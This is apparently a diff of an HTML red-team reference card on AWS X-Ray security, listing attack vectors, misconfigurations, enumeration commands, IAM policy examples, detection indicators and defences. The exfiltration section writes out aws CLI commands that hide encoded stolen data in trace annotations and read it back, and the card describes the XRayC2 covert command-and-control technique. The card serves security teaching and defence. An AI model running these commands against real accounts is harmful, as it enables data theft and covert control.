@@ -263,7 +263,7 @@
         <span class="header-title">AWS X-Ray Security</span>
         <span class="header-badge">MONITORING</span>
       </div>
-      <p class="header-desc">AWS X-Ray is a distributed tracing service that collects data about application requests. Trace data can contain sensitive application details, PII in annotations/metadata, internal architecture topology, and downstream dependencies. X-Ray has been weaponized as a covert C2 channel (XRayC2).</p>
+      <p class="header-desc">AWS X-Ray is a distributed tracing service that collects data about requests served by your application. Trace data can contain sensitive application details, PII in annotations/metadata, internal architecture topology, and downstream service dependencies. X-Ray has been weaponized as a covert C2 channel (XRayC2) by encoding commands into trace annotations.</p>
     </div>
   </div>
 </div>
@@ -275,12 +275,12 @@
           <div class="stat-label">Data Sensitivity</div>
         </div>
         <div class="stat-card">
-          <div class="stat-value" style="color: #4ade80;">Always On</div>
+          <div class="stat-value" style="color: #4ade80;">Always on (default: built-in, optional: KMS)</div>
           <div class="stat-label">Encryption at Rest</div>
         </div>
         <div class="stat-card">
-          <div class="stat-value" style="color: #60a5fa;">Opt-in</div>
-          <div class="stat-label">Data Events</div>
+          <div class="stat-value" style="color: #60a5fa;">Management (default) + Data (opt-in)</div>
+          <div class="stat-label">CloudTrail Logging</div>
         </div>
         <div class="stat-card">
           <div class="stat-value" style="color: #c084fc;">PROVEN</div>
@@ -288,19 +288,19 @@
         </div></div>
 
 <!-- Overview -->
-<div class="section"><h2><span style="color:#eab308;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+<div class="section"><h2><span style="color:#eab308;">📋</span> Service Overview</h2><div class="overview-grid">
         <div>
           <h4 style="color: #eab308;">Trace Data and Segments</h4>
-          <p>X-Ray collects trace segments with timing data, annotations (indexed key-value pairs), and metadata. Annotations and metadata can inadvertently contain PII, secrets, database queries, or service topology.</p>
-          <div class="attack-note"><span style="color:#eab308;">Attack note:</span> Annotations are indexed and searchable via filter expressions -- any sensitive data in annotations is queryable by anyone with xray:GetTraceSummaries permission.</div>
-        </div>
-        <div>
-          <h4 style="color: #eab308;">C2 Channel Abuse</h4>
-          <p>X-Ray integrates with Lambda, API Gateway, ECS, EKS, EC2, SNS, SQS. The XRayC2 tool weaponizes X-Ray as a covert C2 channel by encoding commands into trace annotations.</p>
-          <div class="attack-note"><span style="color:#eab308;">Attack note:</span> XRayC2 encodes commands into trace annotations via PutTraceSegments and retrieves results via GetTraceSummaries, blending malicious traffic with legitimate tracing data.</div>
+          <p>X-Ray collects trace segments from instrumented applications. Each segment contains timing data, annotations (indexed key-value pairs), and metadata (non-indexed key-value pairs of any type). Annotations and metadata can inadvertently contain PII, secrets, database queries, or internal service topology.</p>
+          <div class="attack-note"><span style="color:#eab308;">Red Team Note:</span> Annotations are indexed and searchable via filter expressions -- any sensitive data in annotations is queryable by anyone with xray:GetTraceSummaries permission.</div>
+        </div><div>
+          <h4 style="color: #eab308;">Integrations</h4>
+          <p>X-Ray natively integrates with Lambda, API Gateway, ECS, EKS, EC2, SNS, SQS, EventBridge, and App Mesh. DynamoDB calls appear in traces via AWS SDK instrumentation, not as a native integration. Lambda active tracing automatically creates trace segments for invocations. API Gateway tracing is enabled at the stage level. ECS/EKS use the X-Ray daemon as a sidecar container.</p>
+          <div class="attack-note"><span style="color:#eab308;">Attack Note:</span> The XRayC2 tool (by RootUp) weaponizes X-Ray as a covert command-and-control channel. It encodes commands into trace annotations via PutTraceSegments and retrieves results via GetTraceSummaries/BatchGetTraces, blending malicious traffic with legitimate tracing data over xray.[region].amazonaws.com endpoints.</div>
         </div></div></div>
 
 <!-- Risk Assessment -->
+
 <div class="section">
   <h2>Security Risk Assessment</h2>
   <div class="risk-gauge">
@@ -315,17 +315,17 @@
       <div class="risk-score-label">Risk Score</div>
     </div>
   </div>
-  <p class="risk-desc">X-Ray trace data exposes application internals, service topology, and potentially PII. The service has been demonstrated as a viable C2 channel. Misconfigured encryption and overly broad IAM permissions amplify risk. However, X-Ray itself does not directly control infrastructure.</p>
+  <p class="risk-desc">X-Ray trace data exposes application internals, service topology, and potentially PII. The service has been demonstrated as a viable C2 channel. Misconfigured encryption and overly broad IAM permissions amplify risk. However, X-Ray itself does not directly control infrastructure, limiting blast radius compared to services like IAM or EC2.</p>
 </div>
 
 <!-- Main Panels -->
 <div class="panels-grid">
       <div class="panel" style="border-color: #f8717133;">
-        <h3 style="color: #f87171;">&#x2694;&#xFE0F; Attack Vectors</h3><h4 style="color: #f87171;">Data Exfiltration via Traces</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Encode stolen data into trace annotations/metadata</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Retrieve exfiltrated data via GetTraceSummaries</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Use base64-encoded payloads in annotation values</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Leverage cross-account observability (OAM links)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Abuse put-resource-policy for cross-account trace access</li></ul><h4 style="color: #f87171;">Reconnaissance and C2</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Extract app topology from service graphs (GetServiceGraph)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Map internal service dependencies from trace data</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> XRayC2 three-phase C2: beacon, command, exfil</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Poll for commands using annotation filter expressions</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Enumerate sampling rules to understand traced traffic</li></ul></div>
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Data Exfiltration via Traces</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Encode stolen data into trace annotations/metadata via PutTraceSegments</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Retrieve exfiltrated data via GetTraceSummaries or BatchGetTraces</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Use base64-encoded payloads in annotation values to blend with normal trace data</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Leverage cross-account observability (OAM links) to send data to external monitoring accounts</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Abuse put-resource-policy to grant cross-account access to trace data</li></ul><h4 style="color: #f87171;">Reconnaissance and C2</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Extract application topology from service graphs (GetServiceGraph)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Map internal service dependencies and downstream API calls from trace data</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Use XRayC2 three-phase C2: beacon via PutTraceSegments, command delivery via annotations, exfil via trace segments</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Poll for commands using GetTraceSummaries with filter expressions on annotations</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Enumerate sampling rules to understand what traffic is being traced (GetSamplingRules)</li></ul></div>
       <div class="panel" style="border-color: #fb923c33;">
-        <h3 style="color: #fb923c;">&#x26A0;&#xFE0F; Misconfigurations</h3><h4 style="color: #fb923c;">Encryption and Access</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Default AWS-managed encryption instead of CMK</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Granting xray:* to application roles</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> CloudTrail data events not enabled for X-Ray</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> PutTraceSegments from unexpected principals</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing resource policies for cross-account restriction</li></ul><h4 style="color: #fb923c;">Data Exposure</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> PII, secrets, or tokens logged in annotations</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Sensitive data in trace metadata (stored plaintext)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Overly broad sampling rules capturing all traffic</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Not using X-Ray groups to isolate sensitive data</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> AWSXrayCrossAccountSharingConfiguration unrestricted</li></ul></div>
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Encryption and Access</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Using default AWS-managed encryption instead of customer-managed KMS key (limits audit and key rotation control)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Granting xray:* (AWSXrayFullAccess) to application roles that only need write access</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Not enabling CloudTrail data events for X-Ray (PutTraceSegments calls go unlogged by default)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Allowing PutTraceSegments from unexpected principals (enables C2 and data injection)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing resource policies to restrict cross-account trace submission</li></ul><h4 style="color: #fb923c;">Data Exposure</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Logging PII, secrets, or tokens in trace annotations (indexed and searchable)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Logging sensitive data in trace metadata (stored in plaintext within traces)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Overly broad sampling rules that capture all traffic including sensitive endpoints</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Not using X-Ray groups with filter expressions to isolate sensitive trace data</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Granting AWSXrayCrossAccountSharingConfiguration without restricting which accounts can link</li></ul></div>
       <div class="panel" style="border-color: #22d3ee33;">
-        <h3 style="color: #22d3ee;">&#x1F50D; Enumeration</h3><div class="cmd-block">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3><div class="cmd-block">
           <div class="cmd-title">List Encryption Configuration</div>
           <pre><code>aws xray get-encryption-config</code></pre>
         </div><div class="cmd-block">
@@ -335,139 +335,208 @@
           <div class="cmd-title">List All Groups</div>
           <pre><code>aws xray get-groups</code></pre>
         </div><div class="cmd-block">
-          <div class="cmd-title">Get Trace Summaries (Last 10 min)</div>
+          <div class="cmd-title">Get Trace Summaries (last 10 minutes)</div>
           <pre><code>aws xray get-trace-summaries \
-  --start-time $(date -u -v-10M +%s) \
+  --start-time $(date -u -d '10 minutes ago' +%s 2&gt;/dev/null || date -u -v-10M +%s) \
+  --end-time $(date -u +%s)</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Retrieve Specific Traces</div>
+          <pre><code>aws xray batch-get-traces \
+  --trace-ids &quot;1-67890abc-def012345678abcdef012345&quot;</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Get Service Graph (last hour)</div>
+          <pre><code>aws xray get-service-graph \
+  --start-time $(date -u -d '1 hour ago' +%s 2&gt;/dev/null || date -u -v-1H +%s) \
   --end-time $(date -u +%s)</code></pre>
         </div><div class="cmd-block">
           <div class="cmd-title">List Resource Policies</div>
           <pre><code>aws xray list-resource-policies</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">List Tags on a Resource</div>
+          <pre><code>aws xray list-tags-for-resource \
+  --resource-arn &quot;arn:aws:xray:us-east-1:123456789012:group/my-group/UniqueID&quot;</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Get Insight Summaries</div>
+          <pre><code>aws xray get-insight-summaries \
+  --start-time $(date -u -d '24 hours ago' +%s 2&gt;/dev/null || date -u -v-24H +%s) \
+  --end-time $(date -u +%s) \
+  --group-arn &quot;arn:aws:xray:us-east-1:123456789012:group/my-group/UniqueID&quot;</code></pre>
         </div></div>
       <div class="panel" style="border-color: #c084fc33;">
-        <h3 style="color: #c084fc;">&#x1F4C8; Privilege Escalation</h3><h4 style="color: #c084fc;">Data Exfiltration Paths</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> PutTraceSegments to encode arbitrary data</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> GetTraceSummaries with annotation filters to retrieve data</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> BatchGetTraces for full trace content</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> GetServiceGraph for application topology mapping</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Cross-account OAM links for data movement</li></ul><div class="note"><strong>Key insight:</strong> PutTraceSegments is a data event in CloudTrail. Unless data events are explicitly enabled for X-Ray, these calls are invisible to audit logs.</div></div>
-      <div class="panel" style="border-color: #facc1533;">
-        <h3 style="color: #facc15;">&#x1F517; Persistence</h3><h4 style="color: #facc15;">C2 Channel</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Beacon via PutTraceSegments with encoded commands</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Command delivery via trace annotations</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Exfiltration via trace segment metadata</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Polling via GetTraceSummaries with filter expressions</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Blends with legitimate tracing traffic</li></ul><h4 style="color: #facc15;">Data Access</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Maintain read access to trace data for recon</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify sampling rules to capture specific endpoints</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create resource policies for cross-account access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Modify encryption config to use attacker KMS key</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create groups with filter expressions for target data</li></ul></div>
-      <div class="panel" style="border-color: #4ade8033;">
-        <h3 style="color: #4ade80;">&#x1F6E1;&#xFE0F; Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> PutEncryptionConfig - encryption changed</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateSamplingRule - sampling rule created</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> PutResourcePolicy - cross-account policy changed</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateGroup - new trace group created</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateSamplingRule - sampling modified</li></ul><h4 style="color: #4ade80;">C2 Indicators</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Unexpected PutTraceSegments from non-app principals</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Repeated GetTraceSummaries with annotation filters</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Annotations containing base64 or unusually long values</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> PutTraceSegments from IPs outside known infrastructure</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Unusual spikes in trace submission volume</li></ul></div></div>
-
-<!-- Exploitation -->
-<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid"><div class="cmd-block">
-          <div class="cmd-title">Inject Data into Traces (Exfiltration)</div>
-          <pre><code>aws xray put-trace-segments \
-  --trace-segment-documents '{"trace_id":"1-67890abc-def012345678abcdef012345","id":"abcd1234","start_time":1700000000,"end_time":1700000001,"name":"exfil","annotations":{"payload":"BASE64_ENCODED_DATA"}}'</code></pre>
-        </div><div class="cmd-block">
-          <div class="cmd-title">Retrieve Exfiltrated Data</div>
-          <pre><code>aws xray get-trace-summaries \
-  --start-time $(date -u -v-1H +%s) --end-time $(date -u +%s) \
-  --filter-expression 'annotation.payload BEGINSWITH "exfil"'</code></pre>
-        </div><div class="cmd-block">
-          <div class="cmd-title">Get Full Trace Content</div>
-          <pre><code>aws xray batch-get-traces \
-  --trace-ids &quot;1-67890abc-def012345678abcdef012345&quot;</code></pre>
-        </div><div class="cmd-block">
-          <div class="cmd-title">Get Service Graph (Topology)</div>
-          <pre><code>aws xray get-service-graph \
-  --start-time $(date -u -v-1H +%s) --end-time $(date -u +%s)</code></pre>
-        </div></div></div>
+        <h3 style="color: #c084fc;">📤 Data Exfiltration</h3><h4 style="color: #c084fc;">Injecting Data into Traces</h4><p>An attacker with xray:PutTraceSegments permission can encode arbitrary data into trace segments:</p><pre><code>aws xray put-trace-segments \
+  --trace-segment-documents '{
+    &quot;trace_id&quot;: &quot;1-67890abc-def012345678abcdef012345&quot;,
+    &quot;id&quot;: &quot;abcd1234abcd1234&quot;,
+    &quot;start_time&quot;: 1700000000,
+    &quot;end_time&quot;: 1700000001,
+    &quot;name&quot;: &quot;exfil-segment&quot;,
+    &quot;annotations&quot;: {
+      &quot;payload&quot;: &quot;BASE64_ENCODED_STOLEN_DATA_HERE&quot;
+    }
+  }'</code></pre><h4 style="color: #c084fc;">Retrieving Exfiltrated Data</h4><p>An attacker retrieves data by filtering on known annotation keys:</p><pre><code>aws xray get-trace-summaries \
+  --start-time $(date -u -d '1 hour ago' +%s 2&gt;/dev/null || date -u -v-1H +%s) \
+  --end-time $(date -u +%s) \
+  --filter-expression 'annotation.payload BEGINSWITH &quot;exfil&quot;'</code></pre><p>Then fetch full trace content:</p><pre><code>aws xray batch-get-traces --trace-ids &quot;1-67890abc-def012345678abcdef012345&quot;</code></pre><div class="note"><strong>Warning:</strong> PutTraceSegments is a data event in CloudTrail. Unless CloudTrail data events are explicitly enabled for X-Ray, these calls are invisible to audit logs.</div></div></div>
 
 <!-- Policies -->
-<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid"><div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+<div class="section"><h2><span style="color:#4ade80;">📜</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
           <div class="policy-header">
             <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
-            <span style="color: #f87171; font-weight: 600;">Dangerous - Full X-Ray Access</span>
+            <span style="color: #f87171; font-weight: 600;">Overly Permissive -- Full X-Ray Access</span>
           </div>
           <pre><code>{
-  &quot;Effect&quot;: &quot;Allow&quot;,
-  &quot;Action&quot;: &quot;xray:*&quot;,
-  &quot;Resource&quot;: &quot;*&quot;
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;xray:*&quot;,
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
 }</code></pre>
-          <p class="policy-desc">Full control including encryption changes, sampling rules, resource policies, and ability to read/write all trace data</p>
+          <p class="policy-desc">Grants full control including encryption changes, sampling rule modification, resource policy changes, and ability to read all trace data. Equivalent to AWSXrayFullAccess.</p>
         </div><div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
           <div class="policy-header">
             <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
-            <span style="color: #4ade80; font-weight: 600;">Secure - Daemon Write-Only</span>
+            <span style="color: #4ade80; font-weight: 600;">Least Privilege -- Application Write-Only (Daemon)</span>
           </div>
           <pre><code>{
-  &quot;Effect&quot;: &quot;Allow&quot;,
-  &quot;Action&quot;: [
-    &quot;xray:PutTraceSegments&quot;,
-    &quot;xray:PutTelemetryRecords&quot;,
-    &quot;xray:GetSamplingRules&quot;,
-    &quot;xray:GetSamplingTargets&quot;
-  ],
-  &quot;Resource&quot;: &quot;*&quot;
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;xray:PutTraceSegments&quot;,
+      &quot;xray:PutTelemetryRecords&quot;,
+      &quot;xray:GetSamplingRules&quot;,
+      &quot;xray:GetSamplingTargets&quot;,
+      &quot;xray:GetSamplingStatisticSummaries&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
 }</code></pre>
-          <p class="policy-desc">Matches AWSXRayDaemonWriteAccess. Allows sending traces and sampling config only. No read access to trace data.</p>
+          <p class="policy-desc">Matches the AWSXRayDaemonWriteAccess managed policy. Allows sending traces and retrieving sampling configuration only. No read access to trace data.</p>
         </div><div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
           <div class="policy-header">
             <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
-            <span style="color: #4ade80; font-weight: 600;">Secure - Deny Encryption Downgrade</span>
+            <span style="color: #4ade80; font-weight: 600;">Least Privilege -- Read-Only Monitoring</span>
           </div>
           <pre><code>{
-  &quot;Effect&quot;: &quot;Deny&quot;,
-  &quot;Action&quot;: &quot;xray:PutEncryptionConfig&quot;,
-  &quot;Resource&quot;: &quot;*&quot;
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;xray:GetSamplingRules&quot;,
+      &quot;xray:GetSamplingTargets&quot;,
+      &quot;xray:GetSamplingStatisticSummaries&quot;,
+      &quot;xray:BatchGetTraces&quot;,
+      &quot;xray:GetServiceGraph&quot;,
+      &quot;xray:GetTraceGraph&quot;,
+      &quot;xray:GetTraceSummaries&quot;,
+      &quot;xray:GetGroups&quot;,
+      &quot;xray:GetGroup&quot;,
+      &quot;xray:ListTagsForResource&quot;,
+      &quot;xray:ListResourcePolicies&quot;,
+      &quot;xray:GetTimeSeriesServiceStatistics&quot;,
+      &quot;xray:GetInsightSummaries&quot;,
+      &quot;xray:GetInsight&quot;,
+      &quot;xray:GetInsightEvents&quot;,
+      &quot;xray:GetInsightImpactGraph&quot;,
+      &quot;xray:BatchGetTraceSummaryById&quot;,
+      &quot;xray:GetDistinctTraceGraphs&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
 }</code></pre>
-          <p class="policy-desc">Prevents non-admin roles from changing X-Ray encryption configuration</p>
+          <p class="policy-desc">Read-only access for security monitoring. Matches the AWSXrayReadOnlyAccess managed policy. Cannot modify sampling rules, encryption, or submit trace data.</p>
+        </div><div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Deny Encryption Downgrade</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Deny&quot;,
+    &quot;Action&quot;: &quot;xray:PutEncryptionConfig&quot;,
+    &quot;Resource&quot;: &quot;*&quot;,
+    &quot;Condition&quot;: {
+      &quot;ArnNotLike&quot;: {
+        &quot;aws:PrincipalArn&quot;: &quot;arn:aws:iam::*:role/SecurityAdmin&quot;
+      }
+    }
+  }]
+}</code></pre>
+          <p class="policy-desc">Prevents non-admin roles from changing X-Ray encryption configuration. X-Ray does not provide service-specific condition keys, so the policy denies PutEncryptionConfig for all non-admin principals. Note: setting encryption type to NONE reverts to default built-in encryption -- X-Ray always encrypts data at rest.</p>
         </div></div></div>
 
 <!-- Defenses -->
-<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid"><div class="defense-card">
+<div class="section"><h2><span style="color:#4ade80;">🛡️</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F511;</span>
+            <span class="defense-icon"></span>
             <div>
               <h4>Enable Customer-Managed KMS Encryption</h4>
-              <p>Use a CMK for full control over key rotation, auditing, and access.</p>
-              <pre><code>aws xray put-encryption-config --type KMS --key-id alias/xray-tracing-key</code></pre>
+              <p>Use a customer-managed KMS key for full control over key rotation, auditing, and access. Verify the configuration:</p>
+              <pre><code>aws xray put-encryption-config \
+  --type KMS \
+  --key-id alias/xray-tracing-key</code></pre>
+              <pre><code>aws xray get-encryption-config</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F4DD;</span>
+            <span class="defense-icon"></span>
             <div>
               <h4>Enable CloudTrail Data Events for X-Ray</h4>
-              <p>Capture PutTraceSegments, GetTraceSummaries, and BatchGetTraces calls. These are not logged by default.</p>
+              <p>By default, only management events (CreateGroup, PutEncryptionConfig, etc.) are logged. Enable data events to capture PutTraceSegments, GetTraceSummaries, and BatchGetTraces calls.</p>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F6A8;</span>
+            <span class="defense-icon"></span>
             <div>
               <h4>Monitor for C2 Indicators</h4>
-              <p>Alert on unexpected PutTraceSegments, repeated GetTraceSummaries with annotation filters, and base64-encoded annotation values.</p>
+              <p>Alert on anomalous patterns that indicate XRayC2 abuse: - Unexpected spikes in PutTraceSegments from non-application principals - Repeated GetTraceSummaries calls with annotation filter expressions from unusual IAM entities - Trace annotations containing base64-encoded or unusually long values - PutTraceSegments from IP addresses outside known application infrastructure</p>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F512;</span>
+            <span class="defense-icon"></span>
             <div>
               <h4>Restrict PutTraceSegments to Known Roles</h4>
-              <p>Only application roles running the X-Ray daemon should have PutTraceSegments. Deny for human users.</p>
+              <p>Only application roles running the X-Ray daemon or SDK should have PutTraceSegments permission. Deny this action for human users and non-application roles.</p>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x2699;&#xFE0F;</span>
+            <span class="defense-icon"></span>
             <div>
               <h4>Review and Harden Sampling Rules</h4>
-              <p>Audit sampling rules to exclude sensitive endpoints or sample them minimally.</p>
+              <p>Audit sampling rules to ensure sensitive endpoints are either excluded or sampled minimally. Remove or restrict the default sampling rule if it captures sensitive traffic.</p>
               <pre><code>aws xray get-sampling-rules</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F9F9;</span>
+            <span class="defense-icon"></span>
+            <div>
+              <h4>Restrict Cross-Account Access</h4>
+              <p>Review resource policies and OAM links. Remove unnecessary cross-account sharing.</p>
+              <pre><code>aws xray list-resource-policies</code></pre>
+            </div>
+          </div>
+        </div><div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon"></span>
             <div>
               <h4>Sanitize Trace Data</h4>
-              <p>Ensure application code does not log PII, secrets, API keys, or tokens in annotations or metadata.</p>
+              <p>Ensure application code does not log PII, secrets, API keys, or tokens in X-Ray annotations or metadata. Annotations are indexed and searchable -- treat them as semi-public within anyone who has X-Ray read access.</p>
             </div>
           </div>
         </div></div></div>
 
-<!-- Footer -->
 <div class="footer">
-  <p>AWS X-Ray Security Security Card</p>
-  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+  <p><strong>AWS X-Ray Security Card</strong></p>
+  <p>Always obtain proper authorization before testing</p>
 </div>
 
 </body>
